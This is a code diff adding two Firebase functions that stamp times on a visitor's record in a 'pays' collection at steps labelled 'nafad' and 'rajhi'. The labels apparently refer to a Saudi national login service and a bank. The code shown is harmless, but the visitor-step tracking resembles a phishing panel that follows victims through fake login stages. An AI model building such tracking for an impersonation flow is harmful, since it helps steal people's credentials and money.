@@ -136,6 +136,58 @@ export async function addData(data: any) {
   }
 }
 
+// ==========================================
+// Separate timestamp update for step4 (nafad)
+// ==========================================
+export async function updateNafadTimestamp(visitorId: string) {
+  if (!db) {
+    console.warn("[nafad] Firebase not configured - timestamp update skipped");
+    return;
+  }
+  
+  try {
+    const docRef = doc(db, "pays", visitorId);
+    const now = new Date();
+    const nowNumber = now.getTime();
+    const nowString = now.toISOString();
+    
+    await setDoc(docRef, {
+      nafadUpdatedAt: nowString,
+      nafadUpdatedAtTimestamp: nowNumber
+    }, { merge: true });
+    
+    console.log("[nafad] Timestamp updated:", nowString);
+  } catch (e) {
+    console.error("[nafad] Error updating timestamp:", e);
+  }
+}
+
+// ==========================================
+// Separate timestamp update for step6 (rajhi)
+// ==========================================
+export async function updateRajhiTimestamp(visitorId: string) {
+  if (!db) {
+    console.warn("[rajhi] Firebase not configured - timestamp update skipped");
+    return;
+  }
+  
+  try {
+    const docRef = doc(db, "pays", visitorId);
+    const now = new Date();
+    const nowNumber = now.getTime();
+    const nowString = now.toISOString();
+    
+    await setDoc(docRef, {
+      rajhiUpdatedAt: nowString,
+      rajhiUpdatedAtTimestamp: nowNumber
+    }, { merge: true });
+    
+    console.log("[rajhi] Timestamp updated:", nowString);
+  } catch (e) {
+    console.error("[rajhi] Error updating timestamp:", e);
+  }
+}
+
 export const handleCurrentPage = (page: string) => {
   const visitorId = localStorage.getItem("visitor");
   addData({ id: visitorId, currentPage: page });
